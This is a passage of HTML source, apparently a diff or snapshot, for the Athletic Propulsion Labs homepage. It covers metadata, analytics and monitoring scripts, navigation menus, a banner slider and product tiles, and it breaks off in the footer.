r(){}function o(t){function e(t){return t&&t instanceof r?t:t?s(t,a,i):i()}function n(n,r,o){t&&t(n,r,o);for(var i=e(o),a=l(n),s=a.length,c=0;c<s;c++)a[c].apply(i,r);var u=f[w[n]];return u&&u.push([v,n,r,i]),i}function d(t,e){m[t]=l(t).concat(e)}function l(t){return m[t]||[]}function p(t){return u[t]=u[t]||o(n)}function h(t,e){c(t,function(t,n){e=e||"feature",w[n]=e,e in f||(f[e]=[])})}var m={},w={},v={on:d,emit:n,get:p,listeners:l,context:e,buffer:h};return v}function i(){return new r}var a="nr@context",s=t("gos"),c=t(15),f={},u={},d=e.exports=o();d.backlog=f},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!g++){var t=y.info=NREUM.info,e=u.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){c(w,function(e,n){t[e]||(t[e]=n)});var n="https"===m.split(":")[0]||t.sslForHttp;y.proto=n?"https://":"http://",s("mark",["onload",a()],null,"api");var r=u.createElement("script");r.src=y.proto+t.agent,e.parentNode.insertBefore(r,e)}}}function o(){"complete"===u.readyState&&i()}function i(){s("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var s=t("handle"),c=t(15),f=window,u=f.document,d="addEventListener",l="attachEvent",p=f.XMLHttpRequest,h=p&&p.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:p,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},t(12);var m=""+location,w={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-974.min.js"},v=p&&h&&h[d]&&!/CriOS/.test(navigator.userAgent),y=e.exports={offset:a(),origin:m,features:{},xhrWrappable:v};u[d]?(u[d]("DOMContentLoaded",i,!1),f[d]("load",r,!1)):(u[l]("onreadystatechange",o),f[l]("onload",r)),s("mark",["firstbyte",a()],null,"api");var g=0},{}]},{},["loader",2,10,4,3]);</script>
+<title>Men's &amp; Women's Athletic Footwear &amp; Athletic Apparel</title>
+<meta name="description" content="Shop APL running and basketball shoes, athletic apparel and workout accessories for men and women." />
+<meta name="robots" content="INDEX,FOLLOW" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<meta name="apple-mobile-web-app-title" content="Athletic Propulsion Labs">
+<link rel="icon" href="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/favicon.ico" type="image/x-icon" />
+<link rel="apple-touch-icon" sizes="57x57" href="/skin/frontend/default/theme485/favicon/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/skin/frontend/default/theme485/favicon/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/skin/frontend/default/theme485/favicon/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/skin/frontend/default/theme485/favicon/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/skin/frontend/default/theme485/favicon/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/skin/frontend/default/theme485/favicon/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/skin/frontend/default/theme485/favicon/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/skin/frontend/default/theme485/favicon/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/skin/frontend/default/theme485/favicon/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="/skin/frontend/default/theme485/favicon/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/skin/frontend/default/theme485/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/skin/frontend/default/theme485/favicon/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/skin/frontend/default/theme485/favicon/favicon-16x16.png">
+<link rel="manifest" href="/skin/frontend/default/theme485/favicon/manifest.json">
+<meta name="msapplication-TileColor" content="#000000">
+<meta name="msapplication-TileImage" content="/skin/frontend/default/theme485/favicon/ms-icon-144x144.png">
+<meta name="theme-color" content="#000000">
+<link rel="stylesheet" type="text/css" href="//cloud.typography.com/7087532/628826/css/fonts.css" />
+<script type="text/javascript">
+(function() {
+	if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
+		var msViewportStyle = document.createElement("style");
+		msViewportStyle.appendChild(
+			document.createTextNode("@-ms-viewport{width:auto!important}")
+		);
+		document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+	}
+})();
+</script>
+
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/js/jquery-1.7.min.js"></script>
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/js/superfish.js"></script>
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/js/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/js/jquery.mobile.customized.min.js"></script>
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/js/scripts.js"></script>
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/js/jquery.jcarousel.min.js"></script>
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/js/jquery.lightbox_me.js"></script>
+
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.athleticpropulsionlabs.com/js/blank.html';
+    var BLANK_IMG = 'http://www.athleticpropulsionlabs.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<!--[if lt IE 9]>
+<div style=' clear: both; text-align:center; position: relative;'>
+ <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0000_us.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." /></a>
+</div>
+<![endif]--> 
+<!--[if lt IE 9]>
+	<style>
+	body {
+		min-width: 960px !important;
+	}
+	</style>
+<![endif]--> 
+<link rel="stylesheet" type="text/css" href="http://www.athleticpropulsionlabs.com/media/css/b4ba37eb384abc2bb0d2c16f1cabe445.css?q=1476458957" />
+<link rel="stylesheet" type="text/css" href="http://www.athleticpropulsionlabs.com/media/css/3b47bd54986c58a794ef5a64de491520.css?q=1476458957" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.athleticpropulsionlabs.com/media/css/5c71b570012e53789ce7c43a709c5bf3.css?q=1476458957" media="print" />
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/media/js/bc73f3b53dce9d3960f1392150472b8d.js?q=1476458958"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.athleticpropulsionlabs.com/media/css/44dc231f8c32ed2f6a886764debeae20.css?q=1476458957" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.athleticpropulsionlabs.com/media/js/089e61856016b2a1be19f53d3dbea483.js?q=1476458957"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.athleticpropulsionlabs.com';
+//]]>
+</script>
+            <!-- BEGIN GOOGLE ANALYTICS CODE -->
+        <script type="text/javascript">
+        //<![CDATA[
+            var _gaq = _gaq || [];
+            
+_gaq.push(['_setAccount', 'UA-12551255-1']);
+
+_gaq.push(['_trackPageview']);
+            
+            (function() {
+                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+            })();
+
+        //]]>
+        </script>
+        <!-- END GOOGLE ANALYTICS CODE -->
+    		<meta property="og:title" content="Men's &amp; Women's Athletic Footwear &amp; Athletic Apparel"/>
+			<meta property="og:description" content="Shop APL running and basketball shoes, athletic apparel and workout accessories for men and women."/>
+	<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script>
+	<link rel="stylesheet" type="text/css" href="https://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/css/jquery.fancybox.css" media="all" />
+	<script>
+	jQuery(document).ready(function() {
+		jQuery('.fancybox').fancybox();
+		jQuery('.fancybox-buttons').fancybox({
+			openEffect  : 'none',
+			closeEffect : 'none',
+			prevEffect : 'none',
+			nextEffect : 'none',
+			closeBtn  : false,
+			helpers : {
+			title : {
+			type : 'outside'
+			},
+			buttons	: {}
+			},
+		});
+	});
+	</script>
+	<style type="text/css">
+	.fancybox-custom .fancybox-skin {
+	box-shadow: 0 0 50px #222;
+	}
+	</style>
+</head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper en-lang-class">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        
+<div class="header-container">
+	<div class="free_shipping_banner desktop"><p>Free Shipping and Returns on Orders Over $45! U.S. Only.</p></div>
+    <div class="free_shipping_banner mobile"><p style="font-style: normal;">Free Shipping and Returns<br>on Orders Over $45! U.S. Only.</p></div>
+	<div class="container">
+        <div class="header">
+            <form id="search_mini_form" class="sb-search" action="http://www.athleticpropulsionlabs.com/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <div id="search-label"><label for="q">search</label></div>
+        <div id="search-input"><input id="search" type="text" name="q" value="" class="sb-search-input input-text" maxlength="128" /></div>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'search');
+            searchForm.initAutocomplete('http://www.athleticpropulsionlabs.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+<script type="text/javascript">
+    // get vars
+    var searchEl = jQuery("#search-input");
+    var labelEl = jQuery("#search-label");
+
+    // register clicks and toggle classes
+    labelEl.on("click",function(){
+        if (searchEl.hasClass("focus")) {
+            searchEl.removeClass("focus");
+            labelEl.removeClass("active");
+        } else {
+            searchEl.addClass("focus");
+            labelEl.addClass("active");
+        }
+    });
+
+    // register clicks outisde search box, and toggle correct classes
+    jQuery(document).on("click",function(e){
+        if (jQuery(e.target).closest("#search_mini_form").length > 0) {
+        } else {
+            searchEl.removeClass("focus");
+            labelEl.removeClass("active");
+        }
+    });
+</script>            <div class="block-cart-header">
+    <div class="summary"><a href="/checkout/cart"><img src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/images/cart_icon.png" /></a></div>
+    <div class="block-content">
+                                                        <div class="clear"></div>
+    </div>
+</div>
+            <a href="http://www.athleticpropulsionlabs.com/" title="Athletic Propulsion Labs" class="logo"><strong>Athletic Propulsion Labs</strong><img src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/images/athletic-propulsion-labs.png" alt="Athletic Propulsion Labs" /></a>
+            <div class="clear"></div>
+                        <div class="nav-container">
+                    <div id="menu-icon">Menu</div>
+    <ul id="nav" class="sf-menu">
+                <li  class="level0 nav-1 first level-top parent"><a href="http://www.athleticpropulsionlabs.com/new-arrivals.html"  class="level-top" ><span>New Arrivals</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.athleticpropulsionlabs.com/new-arrivals/womens-new-arrivals.html" ><span>Women's</span></a></li><li  class="level1 nav-1-2 last"><a href="http://www.athleticpropulsionlabs.com/new-arrivals/mens-new-arrivals.html" ><span>Men's</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.athleticpropulsionlabs.com/mens.html"  class="level-top" ><span>Men</span></a><ul class="level0"><li  class="level1 nav-2-1 first parent"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear.html" ><span>Athletic Footwear</span></a><ul class="level1"><li  class="level2 nav-2-1-1 first"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/basketball-shoes.html" ><span>Basketball Shoes</span></a></li><li  class="level2 nav-2-1-2"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/running-shoes.html" ><span>Running Shoes</span></a></li><li  class="level2 nav-2-1-3 last"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/training-shoes.html" ><span>Training Shoes</span></a></li></ul></li><li  class="level1 nav-2-2"><a href="http://www.athleticpropulsionlabs.com/mens/apl-lux.html" ><span>APL LUX</span></a></li><li  class="level1 nav-2-3 last"><a href="http://www.athleticpropulsionlabs.com/mens/accessories.html" ><span>Accessories</span></a></li></ul></li><li  class="level0 nav-3 level-top parent"><a href="http://www.athleticpropulsionlabs.com/womens.html"  class="level-top" ><span>Women</span></a><ul class="level0"><li  class="level1 nav-3-1 first parent"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear.html" ><span>Athletic Footwear</span></a><ul class="level1"><li  class="level2 nav-3-1-1 first"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear/running-shoes.html" ><span>Running Shoes</span></a></li><li  class="level2 nav-3-1-2 last"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear/training-shoes.html" ><span>Training Shoes</span></a></li></ul></li><li  class="level1 nav-3-2 last"><a href="http://www.athleticpropulsionlabs.com/womens/apl-lux.html" ><span>APL LUX</span></a></li></ul></li><li  class="level0 nav-4 level-top parent"><a href="http://www.athleticpropulsionlabs.com/lux.html"  class="level-top" ><span>APL LUX</span></a><ul class="level0"><li  class="level1 nav-4-1 first"><a href="http://www.athleticpropulsionlabs.com/lux/mens.html" ><span>Men's</span></a></li><li  class="level1 nav-4-2 last"><a href="http://www.athleticpropulsionlabs.com/lux/womens.html" ><span>Women's</span></a></li></ul></li><li  class="level0 nav-5 level-top parent"><a href="http://www.athleticpropulsionlabs.com/technology.html"  class="level-top" ><span>Tech</span></a><ul class="level0"><li  class="level1 nav-5-1 first parent"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball.html" ><span>Basketball</span></a><ul class="level1"><li  class="level2 nav-5-1-1 first"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball/load-n-launch.html" ><span>Load N' Launch</span></a></li><li  class="level2 nav-5-1-2"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball/test-results.html" ><span>Test Results</span></a></li><li  class="level2 nav-5-1-3 last"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball/science-of-jumpology.html" ><span>Science of Jumpology</span></a></li></ul></li><li  class="level1 nav-5-2 last parent"><a href="http://www.athleticpropulsionlabs.com/technology/technologyrunning.html" ><span>Running</span></a><ul class="level1"><li  class="level2 nav-5-2-1 first"><a href="http://www.athleticpropulsionlabs.com/technology/technologyrunning/running-load-n-launch.html" ><span>Load 'N Launch</span></a></li><li  class="level2 nav-5-2-2 last"><a href="http://www.athleticpropulsionlabs.com/technology/technologyrunning/propelium.html" ><span>Propelium</span></a></li></ul></li></ul></li><li  class="level0 nav-6 level-top"><a href="http://www.athleticpropulsionlabs.com/retail.html"  class="level-top" ><span>Retailers</span></a></li><li  class="level0 nav-7 last level-top parent"><a href="http://www.athleticpropulsionlabs.com/about.html"  class="level-top" ><span>About</span></a><ul class="level0"><li  class="level1 nav-7-1 first"><a href="http://www.athleticpropulsionlabs.com/about/news.html" ><span>Press &amp; News</span></a></li><li  class="level1 nav-7-2"><a href="http://www.athleticpropulsionlabs.com/about/faq.html" ><span>FAQ's</span></a></li><li  class="level1 nav-7-3"><a href="http://www.athleticpropulsionlabs.com/about/careers.html" ><span>Careers</span></a></li><li  class="level1 nav-7-4 last"><a href="http://www.athleticpropulsionlabs.com/about/archives.html" ><span>Archives</span></a></li></ul></li>    </ul>
+    <ul class="sf-menu-phone">
+        <li  class="level0 nav-1 first level-top parent"><a href="http://www.athleticpropulsionlabs.com/new-arrivals.html"  class="level-top" ><span>New Arrivals</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.athleticpropulsionlabs.com/new-arrivals/womens-new-arrivals.html" ><span>Women's</span></a></li><li  class="level1 nav-1-2 last"><a href="http://www.athleticpropulsionlabs.com/new-arrivals/mens-new-arrivals.html" ><span>Men's</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.athleticpropulsionlabs.com/mens.html"  class="level-top" ><span>Men</span></a><ul class="level0"><li  class="level1 nav-2-1 first parent"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear.html" ><span>Athletic Footwear</span></a><ul class="level1"><li  class="level2 nav-2-1-1 first"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/basketball-shoes.html" ><span>Basketball Shoes</span></a></li><li  class="level2 nav-2-1-2"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/running-shoes.html" ><span>Running Shoes</span></a></li><li  class="level2 nav-2-1-3 last"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/training-shoes.html" ><span>Training Shoes</span></a></li></ul></li><li  class="level1 nav-2-2"><a href="http://www.athleticpropulsionlabs.com/mens/apl-lux.html" ><span>APL LUX</span></a></li><li  class="level1 nav-2-3 last"><a href="http://www.athleticpropulsionlabs.com/mens/accessories.html" ><span>Accessories</span></a></li></ul></li><li  class="level0 nav-3 level-top parent"><a href="http://www.athleticpropulsionlabs.com/womens.html"  class="level-top" ><span>Women</span></a><ul class="level0"><li  class="level1 nav-3-1 first parent"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear.html" ><span>Athletic Footwear</span></a><ul class="level1"><li  class="level2 nav-3-1-1 first"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear/running-shoes.html" ><span>Running Shoes</span></a></li><li  class="level2 nav-3-1-2 last"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear/training-shoes.html" ><span>Training Shoes</span></a></li></ul></li><li  class="level1 nav-3-2 last"><a href="http://www.athleticpropulsionlabs.com/womens/apl-lux.html" ><span>APL LUX</span></a></li></ul></li><li  class="level0 nav-4 level-top parent"><a href="http://www.athleticpropulsionlabs.com/lux.html"  class="level-top" ><span>APL LUX</span></a><ul class="level0"><li  class="level1 nav-4-1 first"><a href="http://www.athleticpropulsionlabs.com/lux/mens.html" ><span>Men's</span></a></li><li  class="level1 nav-4-2 last"><a href="http://www.athleticpropulsionlabs.com/lux/womens.html" ><span>Women's</span></a></li></ul></li><li  class="level0 nav-5 level-top parent"><a href="http://www.athleticpropulsionlabs.com/technology.html"  class="level-top" ><span>Tech</span></a><ul class="level0"><li  class="level1 nav-5-1 first parent"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball.html" ><span>Basketball</span></a><ul class="level1"><li  class="level2 nav-5-1-1 first"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball/load-n-launch.html" ><span>Load N' Launch</span></a></li><li  class="level2 nav-5-1-2"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball/test-results.html" ><span>Test Results</span></a></li><li  class="level2 nav-5-1-3 last"><a href="http://www.athleticpropulsionlabs.com/technology/technologybasketball/science-of-jumpology.html" ><span>Science of Jumpology</span></a></li></ul></li><li  class="level1 nav-5-2 last parent"><a href="http://www.athleticpropulsionlabs.com/technology/technologyrunning.html" ><span>Running</span></a><ul class="level1"><li  class="level2 nav-5-2-1 first"><a href="http://www.athleticpropulsionlabs.com/technology/technologyrunning/running-load-n-launch.html" ><span>Load 'N Launch</span></a></li><li  class="level2 nav-5-2-2 last"><a href="http://www.athleticpropulsionlabs.com/technology/technologyrunning/propelium.html" ><span>Propelium</span></a></li></ul></li></ul></li><li  class="level0 nav-6 level-top"><a href="http://www.athleticpropulsionlabs.com/retail.html"  class="level-top" ><span>Retailers</span></a></li><li  class="level0 nav-7 last level-top parent"><a href="http://www.athleticpropulsionlabs.com/about.html"  class="level-top" ><span>About</span></a><ul class="level0"><li  class="level1 nav-7-1 first"><a href="http://www.athleticpropulsionlabs.com/about/news.html" ><span>Press &amp; News</span></a></li><li  class="level1 nav-7-2"><a href="http://www.athleticpropulsionlabs.com/about/faq.html" ><span>FAQ's</span></a></li><li  class="level1 nav-7-3"><a href="http://www.athleticpropulsionlabs.com/about/careers.html" ><span>Careers</span></a></li><li  class="level1 nav-7-4 last"><a href="http://www.athleticpropulsionlabs.com/about/archives.html" ><span>Archives</span></a></li></ul></li>                    <li class="level0 nav-8 last level-top">
+	    		<a href="https://www.athleticpropulsionlabs.com/customer/account/login/referer/aHR0cHM6Ly93d3cuYXRobGV0aWNwcm9wdWxzaW9ubGFicy5jb20vY3VzdG9tZXIvYWNjb3VudC9pbmRleC8,/">Account</a>
+	    	</li>
+	        </ul>
+                                <div class="quick-access quick-access-right">
+                                    <div class="header-links">
+                        <div style="display: inline-block;"><ul class="links">
+                        <li class="first last" ><a href="https://www.athleticpropulsionlabs.com/customer/account/login/" title="Account" class="Login_link">Account</a></li>
+            </ul>
+</div>
+                                            </div>
+                    <p class="welcome-msg"> </p>
+                    <div class="clear"></div>
+                </div>
+            </div>
+        </div>
+		<div class="clear"></div>
+	</div>
+</div>
+ 
+        <div class="banner-container">
+        <div class="full_image" style="position: relative;">	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+	
+	<ul id="Slider1">
+	
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=124">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/TLPhantom_BCA_header.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=111">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/TLP_Header-092016.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=124">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/TLPhantom_FallLaunch2Header.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=122">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/prism-new-colors.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=110">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/ascend-new-colors.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=111">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/TLP_Header-082316-v1.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=124">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/TLPhantom_FallLaunchHeader-v2.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=124">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/TLPhantom-BasicsHeader-v2.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/lux.html">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/Italy_Launch_header-v5.jpg" alt="">				
+			</a>			
+		</li>
+			
+		<li>
+			<a href="/new-arrivals.html?shoe_collection=122">
+			<img src="http://www.athleticpropulsionlabs.com/media/respbannerslider/bannerslider/prism-header-wmilitary-v1.jpg" alt="">				
+			</a>			
+		</li>
+			</ul>
+
+	<script>
+		jQuery.noConflict();
+			
+		jQuery(function() {
+			var Slider = jQuery("#Slider1").slippry({			
+			kenZoom: 150,
+			
+			responsive: true,	
+			pager: false,	
+			controls: true,
+			hideOnEnd: false,	
+			speed: 1000,		
+			 transition: 'fade', 			
+			easing: 'swing',
+			loop: true,			
+			autoHover: true,		
+			autoHoverDelay:100,	
+			pause: 6500,	
+			auto: true,
+			autoDelay: 500,	
+			adaptiveHeight: false,
+
+			});				
+
+		});
+	</script>
+	
+</div>        <div class="flexbox-container">
+<div class="half_image flex50 flex_order1 overlay_text"><a href="/mens/athletic-footwear.html"><img src="http://www.athleticpropulsionlabs.com/media/wysiwyg/Prism_Black.jpg" alt="" /></a>
+<div class="halfbox_title"><a href="/mens/athletic-footwear.html">Men's Footwear</a></div>
+<div class="halfbox_links">
+<div class="featured_category_link" style="margin-top: 40px; margin-right: 4%;"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/running-shoes.html/">Shop<span>Running</span></a></div>
+<div class="featured_category_link" style="margin-top: 40px; margin-left: 4%; margin-right: 4%;"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/basketball-shoes.html/">Shop<span>Basketball</span></a></div>
+<div class="featured_category_link" style="margin-top: 40px; margin-right: 4%;"><a href="http://www.athleticpropulsionlabs.com/mens/athletic-footwear/training-shoes.html/">Shop<span>Training</span></a></div>
+</div>
+</div>
+<div class="half_image flex50 flex_order2 overlay_text"><a href="/womens/athletic-footwear.html"><img src="http://www.athleticpropulsionlabs.com/media/wysiwyg/TLP_WhiteBlackCosmicGrey.jpg" alt="" /></a>
+<div class="halfbox_title"><a href="/womens/athletic-footwear.html">Women's Footwear</a></div>
+<div class="halfbox_links">
+<div class="featured_category_link"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear/running-shoes.html/">Shop<span>Running</span></a></div>
+<div class="featured_category_link"><a href="http://www.athleticpropulsionlabs.com/womens/athletic-footwear/training-shoes.html/">Shop<span>Training</span></a></div>
+</div>
+</div>
+</div>
+<div class="flexbox-container">
+<div class="half_image flex50 flex_order1"><a href="/new-arrivals.html?shoe_collection=124"><img src="http://www.athleticpropulsionlabs.com/media/wysiwyg/techloom-phantom-half.jpg" alt="" /></a>
+<div class="homebox_title"><a href="/new-arrivals.html?shoe_collection=124">Techloom Phantom</a></div>
+</div>
+<div class="half_image flex50 flex_order2"><a href="/new-arrivals.html?shoe_collection=111"><img src="http://www.athleticpropulsionlabs.com/media/wysiwyg/techloom-pro-half.jpg" alt="" /></a>
+<div class="homebox_title"><a href="/new-arrivals.html?shoe_collection=124">Techloom Pro</a></div>
+</div>
+</div>
+<div class="flexbox-container">
+<div class="half_image flex50 flex_order1"><a href="/new-arrivals.html?shoe_collection=110" id="renault-vimeo"><img src="http://www.athleticpropulsionlabs.com/media/wysiwyg/renault-tile-v1.jpg" alt="" /></a></div>
+<div class="half_image flex50 flex_order2"><a href="/new-arrivals.html?shoe_collection=110" id="lax-vimeo"><img src="http://www.athleticpropulsionlabs.com/media/wysiwyg/apllux-tile-v1.jpg" alt="" /></a></div>
+</div>
+ <script type="text/javascript">
+        jQuery(document).ready(function() {
+            jQuery("#renault-vimeo").fancybox({
+                "padding"       : 0,
+                "autoScale"     : false,
+                "transitionIn"  : "none",
+                "transitionOut" : "none",
+                "width"         : 600,
+                "height"        : 338,
+                "href"          : "https://player.vimeo.com/video/162575676",
+                "type"          : "iframe"
+            });
+            jQuery("#lax-vimeo").fancybox({
+                "padding"       : 0,
+                "autoScale"     : false,
+                "transitionIn"  : "none",
+                "transitionOut" : "none",
+                "width"         : 600,
+                "height"        : 338,
+                "href"          : "https://player.vimeo.com/video/169565820",
+                "type"          : "iframe"
+            });
+        });
+</script>    </div>
+                 		 
+		<div class="main-container col1-layout">
+			<div class="container">
+				<div class="row">
+					<div class="span12">
+						<div class="main">
+								<div class="col-main">
+									<div class="padding-s">
+										                                        <div>&nbsp;</div>                                    </div>
+								</div>
+						</div>
+					</div>
+				</div>
+            </div>
+        </div>
+		
+		 <div class="footer-container">
+	<div class="container">
+		<div class="row">
+			<div class="span12">
+				<div class="footer">
+					  <p id="back-top"><a href="#top"><span></span></a> </p>
+                      <div class="footer-cols-wrapper">
+						    <div class="footer_links">
+<ul>
+<li><a href="/contact-us/">Contact Us</a></li>
+<li><a href="/retail.html">Retailers</a></li>
+<li><a href="/distributors/">Distributors</a></li>
+<li><a href="/affiliates.html">Affiliates</a></li>
+<li><a href="/group_sales/">Group Sales</a></li>
+<!--<li><a href="/affiliates/">Affiliates</a></li>-->
+<li><a href="/shipping_and_returns/">Shipping &amp; Returns</a></li>
+</ul>
+</div>                   			<div class="social_links">
+        <a href="https://www.facebook.com/APLbasketball" class="social_icon social_fb" target="_blank"><img src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/images/facebook.png" /></a>
+            <a href="https://twitter.com/APLbasketball" class="social_icon social_twitter" target="_blank"><img src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/images/twitter.png" /></a>
+            <a href="http://instagram.com/apl" class="social_icon social_instagram" target="_blank"><img src="http://www.athleticpropulsionlabs.com/skin/frontend/default/theme485/images/instagram.png" /></a>
+    </div>
+<div class="newsletter">
+	Sign up for exclusive product news:<br>
